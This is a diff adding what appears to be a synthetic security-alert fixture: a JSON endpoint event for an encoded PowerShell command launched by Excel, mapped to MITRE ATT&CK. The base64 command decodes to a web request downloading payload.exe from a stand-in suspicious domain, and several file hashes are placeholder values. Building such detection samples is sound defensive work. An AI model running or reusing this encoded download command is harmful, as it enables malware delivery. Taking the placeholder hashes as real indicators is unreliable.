@@ -1,0 +1,105 @@
+{
+  "@timestamp": "2026-02-11T14:32:07.441Z",
+  "event": {
+    "kind": "alert",
+    "category": ["process", "malware"],
+    "type": ["start", "info"],
+    "action": "process-created",
+    "outcome": "success",
+    "severity": 85,
+    "risk_score": 78,
+    "dataset": "endpoint.events.process",
+    "module": "endpoint"
+  },
+  "host": {
+    "hostname": "WKSTN-FIN-042",
+    "name": "WKSTN-FIN-042.corp.acme.com",
+    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "ip": ["10.10.25.42", "fe80::1a2b:3c4d:5e6f:7890"],
+    "mac": ["00:1A:2B:3C:4D:5E"],
+    "os": {
+      "family": "windows",
+      "name": "Windows 11 Enterprise",
+      "platform": "windows",
+      "version": "10.0.22631"
+    }
+  },
+  "source": {
+    "ip": "10.10.25.42",
+    "port": 49832,
+    "domain": "WKSTN-FIN-042.corp.acme.com"
+  },
+  "destination": {
+    "ip": "203.0.113.50",
+    "port": 443,
+    "domain": "cdn-update.suspicious-domain.com",
+    "geo": {
+      "country_iso_code": "RU",
+      "city_name": "Moscow"
+    }
+  },
+  "process": {
+    "pid": 7284,
+    "name": "powershell.exe",
+    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AcwB1AHMAcABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUA",
+    "parent": {
+      "pid": 3196,
+      "name": "excel.exe"
+    },
+    "hash": {
+      "md5": "7353f60b1739074eb17c5f4dddefe239",
+      "sha1": "de96a6e69944335375dc1ac238336066889d9ffc",
+      "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+    }
+  },
+  "file": {
+    "path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe",
+    "name": "payload.exe",
+    "extension": "exe",
+    "size": 245760,
+    "hash": {
+      "md5": "d41d8cd98f00b204e9800998ecf8427e",
+      "sha1": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
+      "sha256": "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
+    }
+  },
+  "user": {
+    "id": "S-1-5-21-3623811015-3361044348-30300820-1013",
+    "name": "jdoe",
+    "email": "jdoe@acme.com",
+    "domain": "ACME",
+    "roles": ["finance-analyst", "domain-users"]
+  },
+  "threat": {
+    "framework": "MITRE ATT&CK",
+    "technique": {
+      "id": ["T1059.001"],
+      "name": ["PowerShell"]
+    },
+    "tactic": {
+      "id": ["TA0002"],
+      "name": ["Execution"]
+    },
+    "indicator": {
+      "type": "domain-name",
+      "value": "cdn-update.suspicious-domain.com"
+    }
+  },
+  "tags": [
+    "suspicious-powershell",
+    "encoded-command",
+    "parent-office-app",
+    "external-network-connection"
+  ],
+  "x-detectforge": {
+    "rule_id": "df-sigma-2026-0211-ps-encoded",
+    "rule_name": "Suspicious Encoded PowerShell Spawned by Office Application",
+    "rule_version": "1.2.0",
+    "generated_at": "2026-02-10T09:15:00.000Z",
+    "intel_source": "Unit42 Threat Brief",
+    "intel_url": "https://unit42.paloaltonetworks.com/threat-brief-encoded-powershell-2026/",
+    "confidence": "high",
+    "suggested_runbook": "suspicious-powershell-execution-L1"
+  }
+}
